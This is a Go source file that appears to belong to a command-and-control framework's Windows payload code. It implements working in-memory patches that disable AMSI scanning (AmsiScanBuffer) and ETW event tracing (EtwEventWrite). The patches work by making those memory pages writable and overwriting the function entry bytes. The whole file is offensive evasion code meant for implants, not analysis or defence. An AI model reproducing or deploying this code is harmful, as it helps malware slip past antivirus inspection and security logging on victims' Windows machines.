// server/docker/payloads/Windows/patches.go
//go:build windows
// +build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	ntdllDLL = syscall.NewLazyDLL("ntdll.dll")

	virtualProtect         = kernel32DLL.NewProc("VirtualProtect")
	getCurrentProcess      = kernel32DLL.NewProc("GetCurrentProcess")
	ntProtectVirtualMemory = ntdllDLL.NewProc("NtProtectVirtualMemory")
)

const (
	amsiDLL        = "amsi.dll"
	amsiScanBuffer = "AmsiScanBuffer"
)

// AMSI bypass
func patchAMSI() error {
	amsi := windows.NewLazySystemDLL("amsi.dll")
	amsiScanBuffer := amsi.NewProc("AmsiScanBuffer")

	if amsiScanBuffer.Addr() == 0 {
		return fmt.Errorf(Err(E4))
	}

	var patch []byte
	if unsafe.Sizeof(uintptr(0)) == 8 {
		patch = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	} else {
		patch = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00}
	}

	return applyPatch(amsiScanBuffer.Addr(), patch)
}

// ETW bypass
func patchETW() error {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	etwEventWrite := ntdll.NewProc("EtwEventWrite")

	if etwEventWrite.Addr() == 0 {
		return fmt.Errorf(Err(E4))
	}

	var patch []byte
	if unsafe.Sizeof(uintptr(0)) == 8 {
		patch = []byte{0x33, 0xC0, 0xC3}
	} else {
		patch = []byte{0x33, 0xC0, 0xC2, 0x14, 0x00}
	}

	return applyPatch(etwEventWrite.Addr(), patch)
}

func applyPatch(addr uintptr, patch []byte) error {
	var oldProtect uint32

	err := windows.VirtualProtect(
		addr,
		uintptr(len(patch)),
		windows.PAGE_EXECUTE_READWRITE,
		&oldProtect,
	)
	if err != nil {
		return err
	}

	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}

	handle := windows.CurrentProcess()
	flushInstructionCache.Call(
		uintptr(handle),
		addr,
		uintptr(len(patch)),
	)

	windows.VirtualProtect(
		addr,
		uintptr(len(patch)),
		oldProtect,
		&oldProtect,
	)

	return nil
}
